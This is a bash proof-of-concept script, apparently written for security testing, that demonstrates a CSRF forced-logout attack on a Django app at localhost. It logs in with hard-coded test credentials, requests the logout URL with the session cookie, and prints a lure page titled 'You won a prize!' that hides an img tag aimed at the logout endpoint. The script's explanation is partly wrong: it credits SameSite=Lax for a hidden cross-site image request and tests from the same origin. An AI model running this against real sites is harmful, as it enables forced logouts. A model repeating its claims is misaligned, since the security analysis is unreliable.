#!/bin/bash

# POC: CSRF Attack Exploiting SameSite=Lax Cookie Attribute
# Demonstrates how SameSite=Lax allows CSRF attacks on GET-based logout
# Target: http://localhost/accounts/logout/

TARGET_URL="http://localhost"
LOGIN_URL="$TARGET_URL/accounts/login/"
LOGOUT_URL="$TARGET_URL/accounts/logout/"
COOKIE_JAR="/tmp/cookies.txt"

echo "[*] CSRF POC: SameSite=Lax Logout Exploitation"
echo "[*] Target: $LOGOUT_URL"
echo ""

# Step 1: Verify SameSite=Lax is present in cookies
echo "[*] Step 1: Checking cookie SameSite attribute..."
COOKIES_RESPONSE=$(curl -s -I "$LOGIN_URL")
echo "$COOKIES_RESPONSE" | grep -i "set-cookie" > /tmp/cookie_headers.txt

if grep -q "SameSite=Lax" /tmp/cookie_headers.txt; then
    echo "[+] Found SameSite=Lax in cookie headers:"
    grep -i "set-cookie" /tmp/cookie_headers.txt
    echo ""
else
    echo "[!] SameSite=Lax not found in login page cookies"
    echo "[!] Showing all Set-Cookie headers:"
    grep -i "set-cookie" /tmp/cookie_headers.txt || echo "No Set-Cookie headers found"
    echo ""
fi

# Step 2: Perform a login to establish session
echo "[*] Step 2: Logging in to establish session..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_JAR" "$LOGIN_URL")

# Extract CSRF token from login form
CSRF_TOKEN=$(echo "$LOGIN_RESPONSE" | grep -oP "csrfmiddlewaretoken['\"]?\s*[:=]\s*['\"]?\K[a-zA-Z0-9]*" | head -1)

if [ -z "$CSRF_TOKEN" ]; then
    # Try alternative extraction method
    CSRF_TOKEN=$(echo "$LOGIN_RESPONSE" | grep -oP 'name="csrfmiddlewaretoken"\s+value="?\K[^"]*' | head -1)
fi

echo "[+] CSRF Token: ${CSRF_TOKEN:0:20}..."

# Perform login with POST (requires CSRF token)
LOGIN_DATA="username=testuser&password=password123&csrfmiddlewaretoken=$CSRF_TOKEN"
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -d "$LOGIN_DATA" "$LOGIN_URL" > /dev/null

# Verify login was successful by checking if session cookie exists
if [ -f "$COOKIE_JAR" ]; then
    echo "[+] Session cookie established"
    echo "[+] Cookies in jar:"
    cat "$COOKIE_JAR" | grep -v "^#" | awk '{print $6 "=" $7}'
    echo ""
fi

# Step 3: Demonstrate CSRF - GET request to logout
echo "[*] Step 3: Simulating CSRF attack - GET request to logout (cookies will be sent due to SameSite=Lax)..."
echo "[*] Attack scenario: User clicks malicious link from external site"
echo ""

# This GET request will succeed because:
# 1. GET requests don't require CSRF token validation in Django by default
# 2. SameSite=Lax allows cookies to be sent in top-level navigations
CSRF_ATTACK_RESPONSE=$(curl -s -b "$COOKIE_JAR" -i "$LOGOUT_URL" 2>&1)

# Check if logout was successful (302 redirect or successful logout response)
echo "[+] CSRF Attack Response:"
echo "$CSRF_ATTACK_RESPONSE" | head -20
echo ""

# Step 4: Verify logout was successful
echo "[*] Step 4: Verifying if user was logged out (checking if redirected away from protected content)..."
STATUS_CODE=$(echo "$CSRF_ATTACK_RESPONSE" | grep "HTTP" | head -1 | awk '{print $2}')

if [ "$STATUS_CODE" == "302" ] || [ "$STATUS_CODE" == "301" ]; then
    echo "[+] SUCCESS: Logout redirect received (HTTP $STATUS_CODE)"
    echo "[+] VULNERABILITY CONFIRMED: GET request to logout succeeded"
    echo "[+] This is possible because SameSite=Lax allows cookies in top-level navigation"
    echo ""
    echo "[VULNERABILITY DETAILS]"
    echo "- SameSite=Lax allows cookies in top-level GET navigations"
    echo "- Logout endpoint accepts GET requests without CSRF protection"
    echo "- Attacker can force logout via: <a href='http://localhost/accounts/logout/'>Click here</a>"
    echo "- Combined weakness: Weak SameSite + GET-based logout = exploitable CSRF"
else
    echo "[!] Unexpected response code: $STATUS_CODE"
    echo "$CSRF_ATTACK_RESPONSE"
fi

# Step 5: Show HTML attack payload example
echo ""
echo "[*] Step 5: Example HTML attack payload (attacker's website):"
echo ""
cat << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Click here for prize!</title>
</head>
<body>
    <h1>You won a prize!</h1>
    <!-- This will trigger logout on vulnerable site due to SameSite=Lax -->
    <img src="http://localhost/accounts/logout/" style="display:none;">
    <p>Please wait while we process your prize...</p>
</body>
</html>
EOF

echo ""
echo "[*] Analysis Complete"
echo "[*] The vulnerability allows CSRF attacks due to:"
echo "    1. SameSite=Lax cookie attribute (allows cookies in top-level navigations)"
echo "    2. GET-based logout endpoint (no CSRF token validation)"
echo "    3. Combined effect: Attacker can force logout without user knowledge"